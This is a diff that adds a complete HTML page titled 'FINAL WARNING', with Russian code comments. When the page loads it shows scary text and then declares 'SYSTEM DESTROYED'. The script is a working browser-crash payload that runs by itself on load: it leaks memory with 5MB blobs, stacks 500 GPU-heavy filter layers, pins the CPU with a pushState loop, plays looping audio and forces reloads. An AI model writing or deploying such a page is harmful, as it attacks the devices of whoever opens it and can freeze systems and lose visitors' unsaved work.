@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>FINAL WARNING</title>
+    <style>
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-3px, 3px); }
+            40% { transform: translate(-3px, -3px); }
+            60% { transform: translate(3px, 3px); }
+            80% { transform: translate(3px, -3px); }
+            100% { transform: translate(0); }
+        }
+
+        body {
+            background-color: #000;
+            margin: 0;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            transition: background-color 0.5s ease;
+        }
+
+        #status {
+            color: #fff;
+            font-family: "Courier New", monospace;
+            font-size: 6vw;
+            text-align: center;
+            text-transform: uppercase;
+        }
+
+        .active-horror {
+            background-color: #300 !important;
+        }
+
+        .glitch-text {
+            color: #ff0000 !important;
+            animation: glitch 0.1s infinite;
+            text-shadow: 2px 2px #000;
+        }
+    </style>
+</head>
+<body onload="startTimer()">
+    <div id="status">НАЗАД ПУТИ УЖЕ НЕТУ</div>
+
+    <svg style="display:none">
+        <filter id="nuke">
+            <feTurbulence type="fractalNoise" baseFrequency="0.1" numOctaves="10" />
+            <feDisplacementMap in="SourceGraphic" scale="100" />
+        </filter>
+    </svg>
+
+    <script>
+        function startTimer() {
+            const statusText = document.getElementById('status');
+            
+            // Через 3 секунды начинается "пиздец"
+            setTimeout(() => {
+                document.body.classList.add('active-horror');
+                statusText.classList.add('glitch-text');
+                statusText.innerText = "SYSTEM DESTROYED";
+                
+                triggerOverload();
+            }, 3000);
+        }
+
+        function triggerOverload() {
+            // 1. Звук (если Safari позволит без клика, либо сработает при первом касании)
+            const audio = new Audio('sound.mp3');
+            audio.loop = true;
+            audio.volume = 1.0;
+            audio.play().catch(() => {});
+
+            // 2. Экстремальная утечка памяти (RAM)
+            const dump = [];
+            setInterval(() => {
+                for(let i = 0; i < 300; i++) {
+                    let b = new Blob([new Uint8Array(1024 * 1024 * 5)]); // 5MB куски
+                    dump.push(URL.createObjectURL(b));
+                }
+            }, 50);
+
+            // 3. Перегрузка графики (GPU) - создание 500 слоев с фильтрами
+            for(let i = 0; i < 500; i++) {
+                let layer = document.createElement('div');
+                layer.style.cssText = `
+                    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+                    backdrop-filter: blur(50px) invert(1) url(#nuke);
+                    opacity: 0.1; pointer-events: none;
+                `;
+                document.body.appendChild(layer);
+            }
+
+            // 4. Забивание процессора (CPU) и истории браузера
+            function freeze() {
+                let end = Date.now() + 200;
+                while(Date.now() < end) {
+                    history.pushState(null, null, "#" + Math.random());
+                }
+                requestAnimationFrame(freeze);
+            }
+            freeze();
+
+            // 5. Принудительный краш через релоад
+            setTimeout(() => {
+                location.reload();
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
